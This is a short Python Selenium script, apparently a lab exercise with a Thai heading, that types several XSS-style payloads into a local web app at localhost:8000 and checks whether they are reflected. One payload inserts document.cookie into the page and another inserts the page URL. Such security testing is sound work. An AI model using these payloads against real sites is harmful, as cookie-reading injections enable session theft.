## สร้างสคริปต์ด้วยภาษาโปรแกรมอะไรก็ได้ โดยให้ใช้ payload หลายรูปแบบ เพื่อแสดงให้เห็นถึงช่องโหว่

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

URL  = "http://localhost:8000/"

payloads = [
    "<b>test</b>",
    'document.getElementById("output").innerHTML = "<b>" + document.cookie + "</b>";',
    'document.getElementById("output").innerHTML = "<b style="color:red;">" + window.location.href + "</b>"'
]

driver = webdriver.Chrome() 
driver.get(URL)

time.sleep(1)

for p in payloads:
    print("Testing payload:", p)

    input_box = driver.find_element(By.ID, "inputText")
    button = driver.find_element(By.TAG_NAME, "button")


    input_box.clear()
    input_box.send_keys(p)
    button.click()

    time.sleep(1)
    
    output = driver.find_element(By.ID, "output").get_attribute("innerHTML")
    print(output)
    
    if "cookie" in output.lower():
        print(">>> Reflected in output (potential XSS)\n")
    else:
        print("Not reflected\n")

driver.quit()
